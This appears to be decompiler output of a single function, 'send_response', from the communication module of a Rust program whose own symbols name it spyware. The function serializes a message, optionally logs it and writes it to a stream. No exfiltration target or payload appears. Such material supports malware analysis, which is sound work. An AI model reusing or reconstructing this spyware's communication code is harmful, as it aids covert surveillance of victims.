__int64 __fastcall spyware::communication::server::send_response(__int64 a1, __int64 a2)
{
  __int64 v2; // rdx
  __int64 v3; // rbx
  _QWORD *v4; // r14
  __int64 v5; // rax
  __int64 v7; // [rsp+8h] [rbp-A0h] BYREF
  __int64 v8; // [rsp+10h] [rbp-98h]
  _QWORD *v9; // [rsp+18h] [rbp-90h]
  __int64 v10; // [rsp+20h] [rbp-88h] BYREF
  __int64 *v11; // [rsp+28h] [rbp-80h] BYREF
  __int64 v12; // [rsp+30h] [rbp-78h] BYREF
  __int64 v13; // [rsp+38h] [rbp-70h]
  _QWORD *v14; // [rsp+40h] [rbp-68h]
  __int64 v15; // [rsp+48h] [rbp-60h]
  __int64 v16; // [rsp+50h] [rbp-58h]
  _QWORD v17[2]; // [rsp+60h] [rbp-48h] BYREF
  _QWORD v18[7]; // [rsp+70h] [rbp-38h] BYREF

  v10 = a2;
  spyware::communication::serialization::serialize_message((__int64)&v12, a1);
  v3 = v13;
  if ( !__OFSUB__(-v12, 1LL) )
  {
    v4 = v14;
    v7 = v12;
    v8 = v13;
    v9 = v14;
    if ( (unsigned __int64)core::sync::atomic::atomic_load(&v12, a1, v2, -v12) >= 4 )
    {
      v11 = &v7;
      v17[0] = &v11;
      v17[1] = <&T as core::fmt::Debug>::fmt;
      v12 = (__int64)&off_B8AE8;
      v13 = 1LL;
      v16 = 0LL;
      v14 = v17;
      v15 = 1LL;
      v5 = log::__private_api::loc(&off_B8AF8);
      v18[0] = aSpywareCommuni;
      v18[1] = 30LL;
      v18[2] = aSpywareCommuni;
      v18[3] = 30LL;
      v18[4] = v5;
      log::__private_api::log(&v12, 4LL, v18);
      v3 = v8;
      v4 = v9;
    }
    v3 = std::io::Write::write_all(&v10, v3, v4);
    core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&v7);
    if ( !v3 )
      return 0LL;
  }
  return v3;
}